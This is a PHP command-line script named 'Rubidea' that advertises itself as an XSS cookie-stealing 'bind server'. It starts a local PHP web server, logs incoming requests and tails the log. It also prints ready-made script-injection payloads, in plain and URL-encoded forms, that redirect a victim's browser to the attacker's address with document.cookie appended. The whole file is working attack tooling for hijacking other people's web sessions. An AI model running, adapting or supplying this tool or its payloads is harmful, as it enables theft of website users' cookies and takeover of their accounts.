#!/usr/bin/env php
<?php
define( 'ABSPATH', __DIR__ . '/' );
require_once("config/Config.inc.php");
@require_once("logger/Logger.class.php");
$asciiart = "
\033[31m
  ▄████████ ███    █▄  ▀█████████▄   ▄█  ████████▄     ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███ ███  ███   ▀███   ███    ███   ███    ███ 
  ███    ███ ███    ███   ███    ███ ███▌ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄▄██▀ ███    ███  ▄███▄▄▄██▀  ███▌ ███    ███  ▄███▄▄▄       ███    ███ 
▀▀███▀▀▀▀▀   ███    ███ ▀▀███▀▀▀██▄  ███▌ ███    ███ ▀▀███▀▀▀     ▀███████████ 
▀███████████ ███    ███   ███    ██▄ ███  ███    ███   ███    █▄    ███    ███ 
  ███    ███ ███    ███   ███    ███ ███  ███   ▄███   ███    ███   ███    ███ 
  ███    ███ ████████▀  ▄█████████▀  █▀   ████████▀    ██████████   ███    █▀  
  ███    ███                                                                   
\r\n
	- XSS Bind server - Stel cookies from websites.
\033[0m
";
print($asciiart);

echo "	\033[31m[?] Do you want to reset the log?  (yes/no): \033[0m";
$handle = fopen ("php://stdin","r");
$line = fgets($handle);
fclose($handle);
if(trim($line) == 'yes' or trim($line) == 'y'){
    print("\r\n\033[31m	[-] Deleting log file!\033[0m\r\n");
    @unlink(ABSPATH.LOG_FILE);
}

$log = new Logger();
$status = $log->init();

if($status){
	print("\033[32m	[~] Log file created\r\n");
	print("\033[32m	[+] Start bind server at: ". SERVER_ADDR."\033[0m\r\n");
	
}else{
	print("\033[32m [x] Problem to create log file - check permissions\033[0m\r\n");
	exit();
}

print("\r\n");
print("\r\n\033[32m [~] Use address to stel cookies: http://".SERVER_ADDR."/?COOKIES\033[0m");
print("\r\n\033[32m [~] simple: <script>document.location = 'http://".SERVER_ADDR."/?'+document.cookie</script>\033[0m");
print("\r\n\033[32m [~] url encode (+): <script>document.location = 'http://".SERVER_ADDR."/?'%2Bdocument.cookie</script>\033[0m");

print("\r\n");
$cmd_server = "php -S ". SERVER_ADDR ." -t server";
$cmd_tail = "tail -f " . LOG_FILE;


$shandle = popen($cmd_server . ' 2>&1', 'r');
$handle = popen($cmd_tail . ' 2>&1', 'r');

while(true){
$read = fread($handle, 2096);
$read_server = fread($shandle, 2096);
echo "\033[32m\r\n[- SERVER -]\r\n";
echo $read_server;
echo "\033[0m";

echo "\033[0m\033[31m\r\n[- RUBIDEA -]\r\n";
echo $read;
echo "\033[0m";

sleep(1);
}
pclose($handle);
fclose($shangle);
